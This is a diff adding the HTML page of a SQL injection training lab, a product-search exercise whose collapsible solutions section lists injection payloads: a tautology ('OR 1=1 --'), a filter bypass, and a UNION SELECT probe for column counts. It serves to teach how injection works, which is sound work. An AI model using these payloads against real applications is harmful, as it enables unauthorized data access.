@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>SQLi Lab 02 — Product Search</title>
+    <script>
+      (function () {
+        var t = new URLSearchParams(location.search).get("theme");
+        if (t) document.documentElement.dataset.theme = t;
+      })();
+    </script>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/components.css" />
+    <link rel="stylesheet" href="../../../css/labs.css" />
+  </head>
+  <body>
+    <div class="lab-page">
+      <div class="lab-brand">
+        <strong>SQL INJECTION / LAB 02</strong><span>PRODUCT SEARCH</span>
+      </div>
+      <div class="lab-container">
+        <h1>Product Search</h1>
+        <p class="lead">
+          The application intends to show only public products. Investigate what
+          happens when the search condition is manipulated.
+        </p>
+        <div class="lab-card">
+          <div class="eyebrow">STORE SEARCH</div>
+          <label>Search</label
+          ><input
+            id="q"
+            class="lab-input"
+            value="keyboard"
+            autocomplete="off"
+          />
+          <button id="search" class="lab-btn">SEARCH</button>
+          <div id="output"></div>
+        </div>
+        <div class="lab-card">
+          <div class="eyebrow">CHALLENGES</div>
+          <div class="challenge">
+            <strong>01 — Return a hidden product</strong
+            ><small>Find a way to make the filtering condition true.</small>
+          </div>
+          <div class="challenge">
+            <strong>02 — Understand the query</strong
+            ><small
+              >Compare the normal query with the manipulated one shown
+              above.</small
+            >
+          </div>
+          <details class="lab-solutions">
+            <summary>View solutions</summary>
+
+            <div class="solution">
+              <strong>01 — Return a hidden product</strong>
+              <small>Make the <code>public = 1</code> filter irrelevant.</small>
+              <pre><code>Search: %' OR public = 0 --</code></pre>
+              <p class="muted" style="margin: 8px 0 0">
+                The <code>OR public = 0</code> widens the match; the trailing
+                <code>--</code> comments out the original filter.
+              </p>
+            </div>
+
+            <div class="solution">
+              <strong>02 — Return every product</strong>
+              <small>Force a condition that's always true.</small>
+              <pre><code>Search: ' OR 1=1 --</code></pre>
+            </div>
+
+            <div class="solution">
+              <strong>03 — Discover the column count</strong>
+              <small>Prepare for a UNION attack.</small>
+              <pre><code>Search: ' UNION SELECT 1, 2, 3 --</code></pre>
+              <p class="muted" style="margin: 8px 0 0">
+                If the error says the column counts don't match, adjust until
+                they do.
+              </p>
+            </div>
+          </details>
+          <button id="reset" class="lab-btn secondary">RESET</button>
+        </div>
+      </div>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
